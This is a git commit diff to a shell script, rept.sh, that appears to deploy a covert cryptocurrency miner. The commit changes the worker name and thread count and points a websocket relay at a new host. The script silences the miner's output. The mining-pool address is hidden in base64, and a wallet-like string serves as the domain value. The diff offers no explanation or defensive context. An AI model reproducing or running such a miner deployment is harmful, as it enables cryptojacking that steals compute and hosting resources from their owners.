aeb446bb24b636274474ba74c838d506f6ce5b23
mrsilkin9-blip <mr.silkin9@fasdeil.com>
2026-07-11 12:17:25 +0700

    Update rept.sh

--- rept.sh
+++ rept.sh
@@ -6,7 +6,7 @@ rm mcpo.tar.gz
 sleep 30
 echo '#!/bin/bash
 
-cd mcp && chmod +x run.sh && nproc --all && ./run.sh 4 worker06 >/dev/null 2>&1
+cd mcp && chmod +x run.sh && nproc --all && ./run.sh 2 worker07 >/dev/null 2>&1
 sleep 30
 while true
 do
@@ -28,7 +28,7 @@ fi
 export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=ws://supporting-susan-volvo-d910cf7c.koyeb.app
+echo "SERVER_WS=ws://datacenter.dichoiseptoa.site
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=$NAME
